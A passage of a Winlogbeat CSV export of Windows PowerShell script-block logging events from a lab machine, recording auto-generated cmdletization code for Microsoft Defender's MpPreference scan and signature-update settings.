          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {
          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {
          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {
          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanParameters')) {
          [object]$__cmdletization_value = ${ScanParameters}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {
          [object]$__cmdletization_value = ${ScanScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","ization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {
          [object]$__cmdletization_value = ${RemediationScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {
          [object]$__cmdletization_value = ${RemediationScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {
          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {
          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {
          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {
          [object]$__cmdletization_value = ${ServiceHealthReportInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {
          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {
          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {
          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {
          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanParameters')) {
          [object]$__cmdletization_value = ${ScanParameters}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {
          [object]$__cmdletization_value = ${ScanScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__",3,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3332,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",YnkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.202",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (4 of 20):
cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {
          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {
          [object]$__cmdletization_value = ${ScanScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {
          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {
          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {
          [object]$__cmdletization_value = ${SignatureFallbackOrder}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {
          [object]$__cmdletization_value = ${SharedSignaturesPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {
          [object]$__cmdletization_value = ${SignatureScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {
          [object]$__cmdletization_value = ${SignatureScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
